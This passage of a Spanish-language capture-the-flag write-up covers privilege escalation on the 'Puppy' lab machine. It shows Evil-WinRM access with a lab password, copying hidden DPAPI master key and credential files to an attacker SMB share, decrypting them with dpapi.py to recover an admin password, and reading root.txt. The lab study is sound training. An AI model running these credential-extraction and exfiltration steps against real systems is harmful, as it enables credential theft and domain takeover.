+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ evil-winrm -i 10.10.11.70 -u steph.cooper -p <span class="s1">&#39;ChefSteph2025!&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="s1">&#39;quoting_detection_proc&#39;</span> <span class="k">for</span> module Reline
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>teph.cooper<span class="se">\D</span>ocuments&gt;
+</span></span></code></pre></div><h1 id="escalada-de-privilegios">Escalada de privilegios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privilegios">#</a></h1>
+<h2 id="winpeasx64exe">winPEASx64.exe<a hidden class="anchor" aria-hidden="true" href="#winpeasx64exe">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ wget https://github.com/peass-ng/PEASS-ng/releases/download/20241101-6f46e855/winPEASx64.exe
+</span></span><span class="line"><span class="cl">--2025-06-07 21:14:47-- https://github.com/peass-ng/PEASS-ng/releases/download/20241101-6f46e855/winPEASx64.exe
+</span></span><span class="line"><span class="cl">Cargado certificado CA <span class="s1">&#39;/etc/ssl/certs/ca-certificates.crt&#39;</span>
+</span></span><span class="line"><span class="cl">Resolviendo github.com <span class="o">(</span>github.com<span class="o">)</span>... 140.82.121.4
+</span></span><span class="line"><span class="cl">Conectando con github.com <span class="o">(</span>github.com<span class="o">)[</span>140.82.121.4<span class="o">]</span>:443... conectado.
+</span></span><span class="line"><span class="cl">Petición HTTP enviada, esperando respuesta... <span class="m">302</span> Found
+</span></span><span class="line"><span class="cl">Localización: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/207d3f3e-bc37-4b37-ba85-5c4fa16d48c4?X-Amz-Algorithm<span class="o">=</span>AWS4-HMAC-SHA256<span class="p">&amp;</span>X-Amz-Credential<span class="o">=</span>releaseassetproduction%2F20250607%2Fus-east-1%2Fs3%2Faws4_request<span class="p">&amp;</span>X-Amz-Date<span class="o">=</span>20250607T191444Z<span class="p">&amp;</span>X-Amz-Expires<span class="o">=</span>300<span class="p">&amp;</span>X-Amz-Signature<span class="o">=</span>81be8126c8c0a48b4ad96347f3825ffc8a7c84640cab34ab7df9f980940a22c1<span class="p">&amp;</span>X-Amz-SignedHeaders<span class="o">=</span>host<span class="p">&amp;</span>response-content-disposition<span class="o">=</span>attachment%3B%20filename%3DwinPEASx64.exe<span class="p">&amp;</span>response-content-type<span class="o">=</span>application%2Foctet-stream <span class="o">[</span>siguiendo<span class="o">]</span>
+</span></span><span class="line"><span class="cl">--2025-06-07 21:14:48-- https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/207d3f3e-bc37-4b37-ba85-5c4fa16d48c4?X-Amz-Algorithm<span class="o">=</span>AWS4-HMAC-SHA256<span class="p">&amp;</span>X-Amz-Credential<span class="o">=</span>releaseassetproduction%2F20250607%2Fus-east-1%2Fs3%2Faws4_request<span class="p">&amp;</span>X-Amz-Date<span class="o">=</span>20250607T191444Z<span class="p">&amp;</span>X-Amz-Expires<span class="o">=</span>300<span class="p">&amp;</span>X-Amz-Signature<span class="o">=</span>81be8126c8c0a48b4ad96347f3825ffc8a7c84640cab34ab7df9f980940a22c1<span class="p">&amp;</span>X-Amz-SignedHeaders<span class="o">=</span>host<span class="p">&amp;</span>response-content-disposition<span class="o">=</span>attachment%3B%20filename%3DwinPEASx64.exe<span class="p">&amp;</span>response-content-type<span class="o">=</span>application%2Foctet-stream
+</span></span><span class="line"><span class="cl">Resolviendo objects.githubusercontent.com <span class="o">(</span>objects.githubusercontent.com<span class="o">)</span>... 185.199.110.133, 185.199.108.133, 185.199.109.133, ...
+</span></span><span class="line"><span class="cl">Conectando con objects.githubusercontent.com <span class="o">(</span>objects.githubusercontent.com<span class="o">)[</span>185.199.110.133<span class="o">]</span>:443... conectado.
+</span></span><span class="line"><span class="cl">Petición HTTP enviada, esperando respuesta... <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">Longitud: <span class="m">9842176</span> <span class="o">(</span>9,4M<span class="o">)</span> <span class="o">[</span>application/octet-stream<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Grabando a: «winPEASx64.exe»
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">winPEASx64.exe 100%<span class="o">[======================================================================================================================</span>&gt;<span class="o">]</span> 9,39M 51,1MB/s en 0,2s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2025-06-07 21:14:48 <span class="o">(</span>51,1 MB/s<span class="o">)</span> - «winPEASx64.exe» guardado <span class="o">[</span>9842176/9842176<span class="o">]</span>
+</span></span></code></pre></div><p>Con el winPEAS encontramos información relacionada con DPAPI.</p>
+<p><img alt="Puppy Machine 6" loading="lazy" src="/img/puppy/puppy_machine_6.png"></p>
+<h2 id="dpapi-data-protection-api">DPAPI (Data Protection API)<a hidden class="anchor" aria-hidden="true" href="#dpapi-data-protection-api">#</a></h2>
+<p>DPAPI (Data Protection API) es un componente de Windows que permite cifrar y descifrar datos utilizando las credenciales del usuario o del sistema. Es usado por aplicaciones para almacenar contraseñas, claves y otros datos sensibles de forma segura.</p>
+<h3 id="dpapi-master-keys">DPAPI Master Keys<a hidden class="anchor" aria-hidden="true" href="#dpapi-master-keys">#</a></h3>
+<p>Las Master Keys son archivos que contienen una clave maestra generada por DPAPI para cada usuario, estas claves son usadas para cifrar/descifrar otros secretos almacenados.</p>
+<h3 id="dpapi-credentials-file">DPAPI Credentials File<a hidden class="anchor" aria-hidden="true" href="#dpapi-credentials-file">#</a></h3>
+<p>Son archivos que contienen credenciales cifradas con DPAPI como contraseñas etc.</p>
+<h4 id="descargar-archivos-con-smb-server">Descargar archivos con smb server<a hidden class="anchor" aria-hidden="true" href="#descargar-archivos-con-smb-server">#</a></h4>
+<p>Primero viajo a la ruta en la que se encuentra la Master Key para descargarme el archivo cuando llego al directorio no me sale el archivo así que supongo que esta en oculto.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>teph.cooper<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\S</span>-1-5-21-1487982659-1829050783-2281216199-1107&gt; Get-ChildItem -Force -Hidden <span class="s2">&#34;C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>teph.cooper<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\P</span>rotect<span class="se">\S</span>-1-5-21-1487982659-1829050783-2281216199-1107
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode LastWriteTime Length Name
+</span></span><span class="line"><span class="cl">---- ------------- ------ ----
+</span></span><span class="line"><span class="cl">-a-hs- 3/8/2025 7:40 AM <span class="m">740</span> 556a2412-1275-4ccf-b721-e6a0b4f90407
+</span></span><span class="line"><span class="cl">-a-hs- 2/23/2025 2:36 PM <span class="m">24</span> Preferred
+</span></span></code></pre></div><p>Con lo cual vamos a proceder a descargarlo con smb server.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ sudo smbserver.py smbFolder <span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span> -smb2support
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> contraseña para borhub:
+</span></span><span class="line"><span class="cl">/usr/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span class="k">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span class="line"><span class="cl">import pkg_resources
+</span></span><span class="line"><span class="cl">Impacket v0.11.0 - Copyright <span class="m">2023</span> Fortra
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Incoming connection <span class="o">(</span>10.10.11.70,49903<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>DC<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> User DC<span class="se">\ </span>authenticated successfully
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC$<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC$<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Disconnecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Closing down connection <span class="o">(</span>10.10.11.70,49903<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Remaining connections <span class="o">[]</span>
+</span></span></code></pre></div><p>Y repetimos el proceso pero con los archivos con las credenciales.</p>
+<h3 id="local-credential-data">Local Credential Data<a hidden class="anchor" aria-hidden="true" href="#local-credential-data">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Powershell" data-lang="Powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">steph</span><span class="p">.</span><span class="n">cooper</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Credentials</span><span class="p">&gt;</span> <span class="nb">Get-ChildItem</span> <span class="n">-Force</span> <span class="n">-Hidden</span> <span class="s2">&#34;C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">steph</span><span class="p">.</span><span class="n">cooper</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Credentials</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">​</span><span class="n">Mode</span> <span class="n">LastWriteTime</span> <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span> <span class="p">-------------</span> <span class="p">------</span> <span class="p">----</span>
+</span></span><span class="line"><span class="cl"><span class="n">-a-hs</span><span class="p">-</span> <span class="mf">3</span><span class="p">/</span><span class="mf">8</span><span class="p">/</span><span class="mf">2025</span> <span class="mf">8</span><span class="err">:</span><span class="mf">14</span> <span class="n">AM</span> <span class="mf">11068</span> <span class="n">DFBE70A7E5CC19A398EBF1B96859CE5D</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Powershell" data-lang="Powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">steph</span><span class="p">.</span><span class="n">cooper</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Credentials</span><span class="p">&gt;</span> <span class="nb">copy </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">steph</span><span class="p">.</span><span class="n">cooper</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Credentials</span><span class="p">\</span><span class="n">DFBE70A7E5CC19A398EBF1B96859CE5D</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">15</span><span class="p">.</span><span class="mf">254</span><span class="p">\</span><span class="n">smbFolder</span><span class="p">\</span>
+</span></span></code></pre></div><h3 id="enterprise-credential-data">Enterprise Credential Data<a hidden class="anchor" aria-hidden="true" href="#enterprise-credential-data">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">steph</span><span class="p">.</span><span class="n">cooper</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Credentials</span><span class="p">&gt;</span> <span class="nb">Get-ChildItem</span> <span class="n">-Force</span> <span class="s2">&#34;C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">steph</span><span class="p">.</span><span class="n">cooper</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Credentials</span><span class="err">​</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span> <span class="n">LastWriteTime</span> <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span> <span class="p">-------------</span> <span class="p">------</span> <span class="p">----</span>
+</span></span><span class="line"><span class="cl"><span class="n">-a-hs</span><span class="p">-</span> <span class="mf">3</span><span class="p">/</span><span class="mf">8</span><span class="p">/</span><span class="mf">2025</span> <span class="mf">8</span><span class="err">:</span><span class="mf">14</span> <span class="n">AM</span> <span class="mf">11068</span> <span class="n">DFBE70A7E5CC19A398EBF1B96859CE5D</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">steph</span><span class="p">.</span><span class="n">cooper</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Credentials</span><span class="p">&gt;</span> <span class="nb">copy </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">steph</span><span class="p">.</span><span class="n">cooper</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Credentials</span><span class="p">\</span><span class="n">C8D69EBE9A43E9DEBF6B5FBD48B521B9</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">15</span><span class="p">.</span><span class="mf">254</span><span class="p">\</span><span class="n">smbFolder</span><span class="p">\</span>
+</span></span></code></pre></div><h3 id="obtener-credenciales-archivos---impacket-dpapipy">Obtener credenciales archivos - Impacket-Dpapi.py<a hidden class="anchor" aria-hidden="true" href="#obtener-credenciales-archivos---impacket-dpapipy">#</a></h3>
+<p>Primero necesitamos obtener la clave maestra descifrada y para ello vamos a usar <code>dpapi.py</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password <span class="s1">&#39;ChefSteph2025!&#39;</span> -sid S-1-5-21-1487982659-1829050783-2281216199-1107
+</span></span><span class="line"><span class="cl">Impacket v0.11.0 - Copyright <span class="m">2023</span> Fortra
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>MASTERKEYFILE<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Version : <span class="m">2</span> <span class="o">(</span>2<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Guid : 556a2412-1275-4ccf-b721-e6a0b4f90407
+</span></span><span class="line"><span class="cl">Flags : <span class="m">0</span> <span class="o">(</span>0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Policy : 4ccf1275 <span class="o">(</span>1288639093<span class="o">)</span>
+</span></span><span class="line"><span class="cl">MasterKeyLen: <span class="m">00000088</span> <span class="o">(</span>136<span class="o">)</span>
+</span></span><span class="line"><span class="cl">BackupKeyLen: <span class="m">00000068</span> <span class="o">(</span>104<span class="o">)</span>
+</span></span><span class="line"><span class="cl">CredHistLen : <span class="m">00000000</span> <span class="o">(</span>0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">DomainKeyLen: <span class="m">00000174</span> <span class="o">(</span>372<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Decrypted key with User Key <span class="o">(</span>MD4 protected<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
+</span></span></code></pre></div><p>Una vez hemos obtenido la clave vamos a descifrar el archivo de credenciales.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span class="k">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.
+</span></span><span class="line"><span class="cl">import pkg_resources
+</span></span><span class="line"><span class="cl">Impacket v0.11.0 - Copyright <span class="m">2023</span> Fortra
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>CREDENTIAL<span class="o">]</span>
+</span></span><span class="line"><span class="cl">LastWritten : 2025-03-08 15:54:29
+</span></span><span class="line"><span class="cl">Flags : 0x00000030 <span class="o">(</span>CRED_FLAGS_REQUIRE_CONFIRMATION<span class="p">|</span>CRED_FLAGS_WILDCARD_MATCH<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Persist : 0x00000003 <span class="o">(</span>CRED_PERSIST_ENTERPRISE<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Type : 0x00000002 <span class="o">(</span>CRED_TYPE_DOMAIN_PASSWORD<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Target : Domain:target<span class="o">=</span>PUPPY.HTB
+</span></span><span class="line"><span class="cl">Description :
+</span></span><span class="line"><span class="cl">Unknown :
+</span></span><span class="line"><span class="cl">Username : steph.cooper_adm
+</span></span><span class="line"><span class="cl">Unknown : FivethChipOnItsWay2025!
+</span></span></code></pre></div><h3 id="roottxt">Root.txt<a hidden class="anchor" aria-hidden="true" href="#roottxt">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">*</span><span class="nb">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">type </span><span class="n">root</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">a156d9df5a1856a37db713bac39f4d21</span>
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://borhuub.github.io/tags/puppy/">Puppy</a></li>
+      <li><a href="https://borhuub.github.io/tags/medium/">Medium</a></li>
+      <li><a href="https://borhuub.github.io/tags/active-directoy/">Active Directoy</a></li>
+      <li><a href="https://borhuub.github.io/tags/genericwrite/">GenericWrite</a></li>
+      <li><a href="https://borhuub.github.io/tags/genericall/">GenericALL</a></li>
+      <li><a href="https://borhuub.github.io/tags/dpapi/">DPAPI</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://borhuub.github.io/writeups/nocturnal/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Nocutrnal</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://borhuub.github.io/">Borhub Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
